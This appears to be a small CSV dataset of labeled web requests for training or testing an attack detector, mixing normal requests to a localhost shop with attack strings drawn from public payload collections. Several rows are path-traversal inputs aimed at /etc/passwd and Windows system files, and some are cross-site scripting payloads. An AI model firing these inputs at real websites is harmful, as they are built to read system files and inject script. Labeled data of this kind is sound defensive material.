payload,label,source
modo=insertar&precio=9768&B1=Confirmar,normal,csic_2010
"GET http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=CC192F5FCCDF4F1001AEF54C423A861A Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=de_anda&pwd=fauno&remember=off&B1=Entrar HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=377AF4BE6D97C19F3F22C98295D5823E Connection: close",normal,csic_2010
%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\windows\system32\drivers\etc\hosts,path_traversal,payloads_all_the_things
"<IMG SRC=""javascript:javascript:alert(3500);"">",xss,payloads_all_the_things
/etc/jabber/jabber-muc.xml,path_traversal,seclists
"POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=027F84CF4BEFDFE9656B0F23A1FD517C Content-Type: application/x-www-form-urlencoded Connection: close",normal,csic_2010
%c0%fe%c0%fe%c0%2fetc%c0%2fpasswd,path_traversal,payloads_all_the_things
../../../../../../WINNT/php.ini,path_traversal,seclists
id=2&nombre=Jam%F3n+Ib%E9rico%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E&precio=39&cantidad=81&B1=A%F1adir+al+carrito,xss,csic_2010
.%00.%c1%8setc%c1%8spasswd,path_traversal,payloads_all_the_things
